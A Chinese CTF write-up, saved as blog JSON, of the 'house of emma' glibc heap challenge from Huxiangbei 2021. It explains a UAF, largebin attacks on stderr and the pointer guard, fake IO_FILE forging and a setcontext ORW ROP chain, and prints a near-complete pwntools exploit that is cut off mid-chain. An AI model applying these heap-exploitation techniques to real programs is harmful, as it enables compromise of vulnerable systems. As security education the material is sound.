fake_io.ljust(0xc8,b'\\x00')\n\nfake_io += p64(_IO_cookie_jumps+0x38) #vtable 0xd8\nrdi_data = chunk0 + 0xf0\nrdx_data = chunk0 + 0xf0\n\nencrypt_gadget = rotate_left_64(gadget^xor_key,0x11)\nfake_io += p64(rdi_data) # 0xe0\nfake_io += p64(encrypt_gadget) # 0xe8\nfake_io += p64(0) + p64(rdx_data) # 0xf0,0xf8\nfake_io += p64(0)*2 + p64(setcontext + 61) #0x100,0x108,0x110\nfake_io += p64(0xdeadbeef)\nfake_io += b'a'*(0xa0 - 0x30)\n# fake_io += p64(0)*2\nfake_io += p64(chunk0+0x1a0)+p64(pop_rdi+1)\nfake_io += orw\nfake_io += p64(0xdeadbeef)\nfake_io += b'flag\\x00\\x00\\x00\\x00'\nedit(0,fake_io)\nrun()\n#---------------------------------- house of emma\nadd(9,0x4c0)\nrun()\n\nio.interactive()\n```","slug":"ctf比赛复现/湖湘杯-2021-house of emma","published":1,"date":"2025-10-06T14:48:09.864Z","updated":"2025-10-06T15:17:56.553Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2i7000suomy3vw9bt46","content":"<h1 id=\"湖湘杯-2021-house-of-emma\"><a href=\"#湖湘杯-2021-house-of-emma\" class=\"headerlink\" title=\"湖湘杯-2021-house of emma\"></a>湖湘杯-2021-house of emma</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>学习<code>house of emma </code>的过程中找到了他的出处,遂体会</p>\n<h2 id=\"静态分析\"><a href=\"#静态分析\" class=\"headerlink\" title=\"静态分析\"></a>静态分析</h2><p>因为网上的题解(应该是出题人的分享),重点在说明<code>house of emma</code> 这个手法的利用链.但是自己在写题还是不能忽视其他的步骤</p>\n<p>当然,每个函数都分析的话,有些浪费笔墨,所以我也只会分析我觉得重要的地方.</p>\n<h3 id=\"main\"><a href=\"#main\" class=\"headerlink\" title=\"main\"></a>main</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003165813221.png\" alt=\"image.png\"></p>\n<p>其实,刚开始看到这也只是看到,一次读入了<code>0x500</code>字节,也不知道是干啥. 在看完<code>menu</code>函数之后,才反应过来程序的一个流程. 这里的<code>while(1)</code>,让程序一直循环.</p>\n<p>包括在<code>menu</code>里,也是一直循环,所以这里没有常规的方法可以触发<code>exit()</code>.而且这里,所有的<code>opcode</code>,都是一次输入.</p>\n<h3 id=\"menu\"><a href=\"#menu\" class=\"headerlink\" title=\"menu\"></a>menu</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003170338829.png\"></p>\n<p>这里主要是要确认<code>opcode</code>的格式, 每个<code>opcode</code>第一个字节是选项,然后是<code>idx</code>,<code>add()</code>和<code>edit()</code>需要<code>size</code>,<code>edit()</code>还需要<code>content</code></p>\n<p>在这里的<code>case 5,</code>给了我们一个重头再来的机会,让我们可以在泄露地址信息之后回来.</p>\n<h3 id=\"add\"><a href=\"#add\" class=\"headerlink\" title=\"add\"></a>add</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003170858151.png\" alt=\"image.png\"></p>\n<p><code>add()</code>里对堆块的大小和数量,作了一定的限制.并且使用的是<code>calloc</code>,会清空堆块里的原始数据.</p>\n<p>还有在<code>delete()</code>里<code>free</code> 后没有清空指针造成的<code>uaf</code></p>\n<h3 id=\"seccomp\"><a href=\"#seccomp\" class=\"headerlink\" title=\"seccomp\"></a>seccomp</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003171555287.png\" alt=\"image.png\"></p>\n<p>当然,不要忘了这题开了沙箱,专门限制了<code>execve </code>,所以只能<code>orw</code></p>\n<h2 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h2><ol>\n<li>首先是泄露<code>libc</code> 和 <code>heap</code> 地址,可以直接利用<code>uaf</code> 和<code>show()</code>函数做到.</li>\n<li>使用 <code>LargeBin Attack</code> 来在<code> stderr</code> 指针处写一个可控地址</li>\n<li>使用 <code>LargeBin Attack</code> 在<code>__pointer_chk_guard</code> 处写一个已知地址</li>\n<li>通过写入的已知地址与需要调用的函数指针进行构造加密，同时构造出合理的<code> IO_FILE</code> 结构</li>\n<li>利用 Unsorted Bin 会与 Top Chunk 合并的机制来修改 Top Chunk 的 Size，从而触发 <a href=\"https://www.anquanke.com/post/id/235598\">House OF Kiwi</a> 中的 IO 调用</li>\n<li>进入 <code>House_OF_Emma</code> 的调用链，同时寻找一个能够转移 rdi 到 rdx 的 gadget，利用这个 gadget 来为 <code>Setcontext</code> 提供内容</li>\n<li>利用 <code>Setcontext</code> 来执行 <code>ROP</code> 来 <code>ORW</code></li>\n</ol>\n<h2 id=\"exp详解\"><a href=\"#exp详解\" class=\"headerlink\" title=\"exp详解\"></a>exp详解</h2><p>在这里，largebin attack的部分就简单略过描写，我们的重点还是后续伪造<code>fake IO</code></p>\n<h3 id=\"泄露地址\"><a href=\"#泄露地址\" class=\"headerlink\" title=\"泄露地址\"></a>泄露地址</h3><p>以泄露<code>libc</code>为例,首先准备四个堆块.其中一个堆块略大于其他堆块是为后续利用准备.由于本程序的限制,让最小能申请到的堆块都会进入<code>unsorted bin</code>.</p>\n<p>所以我们在free 一个堆块后,再申请一个更大的堆块,就可以把他放入<code>largebins</code>.第一次直接<code>show()</code>,即可泄露<code>libc</code>地址.而要泄露<code>heap</code>地址,要先利用<code>edit()</code>修改<code>fd</code>和<code>bk</code>,这样才能把<code>fd_nextsize</code>的内容,也就是<code>chunk2</code>的地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x410</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x410</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x420</span>)</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">0x410</span>)</span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">0x430</span>)</span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\">run()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;Del Done\\nMalloc Done\\n&quot;</span>)</span><br><span class=\"line\">libc_base=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))-<span class=\"number\">0x1f30b0</span></span><br><span class=\"line\">logv(<span class=\"string\">&quot;libc_base&quot;</span>,<span class=\"built_in\">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"largebins-attack\"><a href=\"#largebins-attack\" class=\"headerlink\" title=\"largebins attack\"></a>largebins attack</h3><p>以修改<code>stderr</code>为例,此时有之前<code>free</code>的<code>chunk2</code>,现在<code>free</code>掉<code>chunk0</code>.此时如果正常,前面再申请一个更大的堆块,结果就是<code>chunk0</code>,会链入<code>largebins</code>.</p>\n<p>现在,先修改<code>chunk2</code>的<code>bk_nextsize</code>,再申请大堆块,就可以往<code>target</code>里写入<code>chunk2</code>的地址.<br>所以成功之后,<code>sterr</code> 就被修改为了<code>chunk2</code></p>\n<p>把<code>chunk2</code> 和 <code>chunk0</code> 改好是为了后续的持续利用</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload = p64(libc_base + <span class=\"number\">0x1f30b0</span>)*<span class=\"number\">2</span> + p64(heap_base +<span class=\"number\">0x2ae0</span>) + p64(stderr - <span class=\"number\">0x20</span>)</span><br><span class=\"line\">edit(<span class=\"number\">2</span>,payload)</span><br><span class=\"line\">add(<span class=\"number\">5</span>,<span class=\"number\">0x430</span>)</span><br><span class=\"line\">edit(<span class=\"number\">2</span>, p64(heap_base + <span class=\"number\">0x22a0</span>) + p64(libc_base + <span class=\"number\">0x1f30b0</span>) + p64(heap_base + <span class=\"number\">0x22a0</span>) * <span class=\"number\">2</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, p64(libc_base + <span class=\"number\">0x1f30b0</span>) + p64(heap_base + <span class=\"number\">0x2ae0</span>) * <span class=\"number\">3</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>, <span class=\"number\">0x410</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"number\">0x420</span>)</span><br><span class=\"line\">run()   </span><br></pre></td></tr></table></figure>\n\n<p>关于<code>largebins attack</code> 的详细利用及原理,不在本文讲解,将在其他文章详细分析</p>\n<h3 id=\"修改top-chunk-size\"><a href=\"#修改top-chunk-size\" class=\"headerlink\" title=\"修改top chunk size\"></a>修改top chunk size</h3><p>这里是<code>exp</code>中的<code>93-102</code>行,这里的<code>chunk7</code> ,<code>size</code>是<code>0x450</code>. <code>free</code>掉会被<code>top chunk</code>合并.我们再次申请<code>0x430</code>大小的chunk 8.</p>\n<p>通过<code>uaf</code>留下的<code>chunk7</code>的<code>size</code> 和 指针,我们就可以修改到<code>top chunk</code>的<code>size</code>.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">7</span>, <span class=\"number\">0x450</span>)</span><br><span class=\"line\">edit(<span class=\"number\">2</span>, p64(heap_base + <span class=\"number\">0x22a0</span>) + p64(libc_base + <span class=\"number\">0x1f30b0</span>) + p64(heap_base + <span class=\"number\">0x22a0</span>) * <span class=\"number\">2</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, p64(libc_base + <span class=\"number\">0x1f30b0</span>) + p64(heap_base + <span class=\"number\">0x2ae0</span>) * <span class=\"number\">3</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"number\">0x420</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>, <span class=\"number\">0x410</span>)</span><br><span class=\"line\">run()</span><br><span class=\"line\">delete(<span class=\"number\">7</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>, <span class=\"number\">0x430</span>)</span><br><span class=\"line\">edit(<span class=\"number\">7</span>,<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x438</span> + p64(<span class=\"number\">0x300</span>))</span><br><span class=\"line\">run()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"fake-io-及-最后的利用链\"><a href=\"#fake-io-及-最后的利用链\" class=\"headerlink\" title=\"fake io 及 最后的利用链\"></a>fake io 及 最后的利用链</h3><p>总算是到了我们本题的重点.首先我们要明确执行到这一步,程序的一个情况.我们最后把<code>top chunk</code>的<code>size</code>修改为了<code>0x300</code>(当然,你想改成多少,就改成多少),然后我们通过申请比这个<code>size</code>大的堆块来触发<code>sysmalloc</code>,继而触发<code>__malloc_assert</code>.</p>\n<p>触发之后,会先调用<code>fxprintf</code>.经过几层调用之后,会在<code>__vfprintf_internal</code>里有如下调用:</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006204940659.png\" alt=\"call \"></p>\n<p>正常情况下<code>rbx</code>是<code>stderr</code>的<code>vatable</code>,这已经被我们替换为了<code>fake io</code>的对应部分.这里我们按照出题者的想法,把这替换成<code>_io_cookie_jumps+0x38</code>,这样可以调用<code>_io_cookie_read</code>.<br>接着往下看:</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006205743073.png\" alt=\"image.png\"></p>\n<p>这里算是<code>house of emma</code>的起点.现在的思路是,利用<code>setcontext</code>去控制程序的执行流(因为这里可以控制rsp的位置)但是这个版本的<code>setcontext</code>的参数控制都是通过<code>rdx</code>来的,所以我们现在需要控制<code>rdx</code></p>\n<p>通过这样的指令,我们可以找到需要的gadgets.为什么这么搜? 首先,<code>grep &quot;rdx&quot;</code>不用过多解释吧. <code>mov</code> 是赋值的,也不多说.为什么最后是<code>call</code> 呢? 因为我们现在不能控制栈,所以我们希望有<code>call</code>和<code>jmp</code> 这样的指令,可以跳转.就解释到这</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary libc.so<span class=\"number\">.6</span> --only <span class=\"string\">&quot;mov|call&quot;</span> |grep <span class=\"string\">&quot;rdx&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006210955555.png\" alt=\"image.png\"></p>\n<p>这条gadget可以利用.首先rdi已经被控制为了<code>fake io+0xe0</code>里的地址,所以这里的<code>rdi+8</code> 和它里面的内容都可以控制.然后,修改了rsp里的内容,无影响.最后调用<code>rdx+20</code>里的内容.</p>\n<p>所以,最后的rdx是 <code>[[fake io+0xe0]+8]</code>,这里注意控制.然后我们控制<code>[rdx+0x20]</code>为<code>setcontext+61</code>,接着就会执行<code>setcontext+61</code>.</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006212459421.png\" alt=\"image.png\"></p>\n<p>第一行就是关键代码,这里我们往<code>fake io</code>后面继续布置.将<code>rdx </code>改到<code>fake io</code>上的某个地址,然后在对应的偏移,继续设置为堆上地址(就是布置的<code>orw</code>的地址).如下图:</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006212914484.png\" alt=\"image.png\"></p>\n<p>然后,需要注意的是<code>rcx</code>,而且它会<code>push rcx</code>,并且在后续会<code>ret</code>.所以我们要让<code>rcx</code>的内容是<code>ret</code>指令,这个很简单,只要在<code>ORW</code>的上方布置一个<code>ret gadget</code>的地址就行了.</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006213147692.png\" alt=\"image.png\"></p>\n<p>然后就是正常的<code>orw</code>的执行了</p>\n<p>伪造<code>fake io</code>的过程,需要配合动调实时查看,一开始一次完成构造不太现实.中间对于偏移的计算也会出现一些问题.</p>\n<p>当然熟练之后,可以把这个写成模板,以后遇到类似的利用就可以直接套用模板来写.</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>,<span class=\"string\">&#x27;-l&#x27;</span>,<span class=\"string\">&#x27;66%&#x27;</span>]</span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;./pwn&quot;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\">opcode=<span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx,size</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> opcode</span><br><span class=\"line\">    opcode+=p8(<span class=\"number\">1</span>)+p8(idx)+p16(size)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> opcode</span><br><span class=\"line\">    opcode+=p8(<span class=\"number\">2</span>)+p8(idx)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> opcode</span><br><span class=\"line\">    opcode+=p8(<span class=\"number\">3</span>)+p8(idx)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,content</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> opcode</span><br><span class=\"line\">    opcode+=p8(<span class=\"number\">4</span>)+p8(idx)+p16(<span class=\"built_in\">len</span>(content))+content</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">run</span>():</span><br><span class=\"line\">    <span class=\"keyword\">global</span> opcode</span><br><span class=\"line\">    opcode += p8(<span class=\"number\">5</span>)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;Pls input the opcode&quot;</span>,opcode)</span><br><span class=\"line\">    opcode=<span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rotate_left_64</span>(<span class=\"params\">x, n</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 确保移动的位数在0-63之间</span></span><br><span class=\"line\">    n = n % <span class=\"number\">64</span></span><br><span class=\"line\">    <span class=\"comment\"># 先左移n位</span></span><br><span class=\"line\">    left_shift = (x &lt;&lt; n) &amp; <span class=\"number\">0xffffffffffffffff</span></span><br><span class=\"line\">    <span class=\"comment\"># 然后右移64-n位，将左移时超出的位移动回来</span></span><br><span class=\"line\">    right_shift = (x &gt;&gt; (<span class=\"number\">64</span> - n)) &amp; <span class=\"number\">0xffffffffffffffff</span></span><br><span class=\"line\">    <span class=\"comment\"># 合并两部分</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> left_shift | right_shift</span><br><span class=\"line\"></span><br><span class=\"line\">script=<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">b *$rebase(0x18B6)</span></span><br><span class=\"line\"><span class=\"string\">b *$rebase(0x12D7)</span></span><br><span class=\"line\"><span class=\"string\">b __vfprintf_internal</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">gdb.attach(io,script)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#---------------------------------- leak libc</span></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x410</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x410</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x420</span>)</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">0x410</span>)</span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">0x430</span>)</span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\">run()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;Del Done\\nMalloc Done\\n&quot;</span>)</span><br><span class=\"line\">libc_base=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))-<span class=\"number\">0x1f30b0</span></span><br><span class=\"line\">logv(<span class=\"string\">&quot;libc_base&quot;</span>,<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">pop_rdi=libc_base+<span class=\"number\">0x2daa2</span></span><br><span class=\"line\">pop_rsi=libc_base+<span class=\"number\">0x37c0a</span></span><br><span class=\"line\">pop_rdx_r12=libc_base+<span class=\"number\">0x1066e1</span></span><br><span class=\"line\">pop_rax=libc_base+<span class=\"number\">0x446c0</span></span><br><span class=\"line\">syscall=libc_base+<span class=\"number\">0x883b6</span> </span><br><span class=\"line\">stderr=libc_base+libc.sym[<span class=\"string\">&quot;stderr&quot;</span>]</span><br><span class=\"line\">setcontext=libc_base+libc.sym[<span class=\"string\">&quot;setcontext&quot;</span>]</span><br><span class=\"line\">open_addr=libc_base+libc.sym[<span class=\"string\">&quot;open&quot;</span>]</span><br><span class=\"line\">read_addr=libc_base+libc.sym[<span class=\"string\">&quot;read&quot;</span>]</span><br><span class=\"line\">write=libc_base+libc.sym[<span class=\"string\">&quot;write&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">_IO_cookie_jumps = libc_base + <span class=\"number\">0x1f3ae0</span></span><br><span class=\"line\">guard = libc_base+ <span class=\"number\">0x2cc770</span></span><br><span class=\"line\"><span class=\"comment\">#----------------------------------leak heap</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\">run()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">heap_base=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))-<span class=\"number\">0x2ae0</span></span><br><span class=\"line\">logv(<span class=\"string\">&quot;heap&quot;</span>,<span class=\"built_in\">hex</span>(heap_base))</span><br><span class=\"line\"><span class=\"comment\">#----------------------------------largein attack stderr </span></span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload = p64(libc_base + <span class=\"number\">0x1f30b0</span>)*<span class=\"number\">2</span> + p64(heap_base +<span class=\"number\">0x2ae0</span>) + p64(stderr - <span class=\"number\">0x20</span>)</span><br><span class=\"line\">edit(<span class=\"number\">2</span>,payload)</span><br><span class=\"line\">add(<span class=\"number\">5</span>,<span class=\"number\">0x430</span>)</span><br><span class=\"line\">edit(<span class=\"number\">2</span>, p64(heap_base + <span class=\"number\">0x22a0</span>) + p64(libc_base + <span class=\"number\">0x1f30b0</span>) + p64(heap_base + <span class=\"number\">0x22a0</span>) * <span class=\"number\">2</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, p64(libc_base + <span class=\"number\">0x1f30b0</span>) + p64(heap_base + <span class=\"number\">0x2ae0</span>) * <span class=\"number\">3</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>, <span class=\"number\">0x410</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"number\">0x420</span>)</span><br><span class=\"line\">run()   </span><br><span class=\"line\"><span class=\"comment\">#----------------------------------largebin attack guard , TLS 地址偏移不固定，直接手改吧</span></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">add(<span class=\"number\">6</span>,<span class=\"number\">0x430</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">edit(<span class=\"number\">2</span>, p64(libc_base + <span class=\"number\">0x1f30b0</span>) * <span class=\"number\">2</span> + p64(heap_base + <span class=\"number\">0x2ae0</span>) + p64(guard - <span class=\"number\">0x20</span>))</span><br><span class=\"line\">add(<span class=\"number\">7</span>, <span class=\"number\">0x450</span>)</span><br><span class=\"line\">edit(<span class=\"number\">2</span>, p64(heap_base + <span class=\"number\">0x22a0</span>) + p64(libc_base + <span class=\"number\">0x1f30b0</span>) + p64(heap_base + <span class=\"number\">0x22a0</span>) * <span class=\"number\">2</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, p64(libc_base + <span class=\"number\">0x1f30b0</span>) + p64(heap_base + <span class=\"number\">0x2ae0</span>) * <span class=\"number\">3</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"number\">0x420</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>, <span class=\"number\">0x410</span>)</span><br><span class=\"line\">run()</span><br><span class=\"line\">delete(<span class=\"number\">7</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>, <span class=\"number\">0x430</span>)</span><br><span class=\"line\">edit(<span class=\"number\">7</span>,<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x438</span> + p64(<span class=\"number\">0x300</span>))</span><br><span class=\"line\">run()</span><br><span class=\"line\"><span class=\"comment\">#----------------------------------写 orw</span></span><br><span class=\"line\">flag = heap_base + <span class=\"number\">0x22a0</span> + <span class=\"number\">0x260</span></span><br><span class=\"line\">orw = p64(pop_rdi)+p64(flag)</span><br><span class=\"line\">orw+= p64(pop_rsi)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">orw+= p64(pop_rax)+p64(<span class=\"number\">2</span>)</span><br><span class=\"line\">orw+= p64(syscall)</span><br><span class=\"line\"></span><br><span class=\"line\">orw+= p64(pop_rdi)+p64(<span class=\"number\">3</span>)</span><br><span class=\"line\">orw+= 